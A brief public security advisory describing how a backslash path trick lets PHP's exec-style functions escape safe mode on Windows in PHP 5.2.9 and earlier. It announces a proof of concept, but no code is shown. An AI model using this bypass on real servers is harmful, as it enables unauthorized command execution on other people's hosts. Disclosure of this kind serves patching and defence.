	Abysssec Inc Public Advisory 
	
	Here is another safemod bypass vulnerability exist in php <= 5.2.9 on windows .
	the problem comes from OS behavior - implement  and interfacing between php
	and operation systems directory structure . the problem is php won't tell difference 
	between directory browsing in linux and windows this can lead attacker to ability 
	execute his / her commands on targert machie even in SafeMod On  (php.ini setting) . 
	=============================================================================
	in linux when you want open a directory for example php directory you need
	to go to /usr/bin/php and you can't use \usr\bin\php . but windows won't tell
	diffence between slash and back slash it means there is no didffrence  between 
	c:\php and c:/php , and this is not vulnerability but itself but  because of this  simple 
	php implement "\" character can escape safemode using  function like excec . 
	here is a PoC for discussed vulnerability . just upload files on your target host and execute
	your commands .
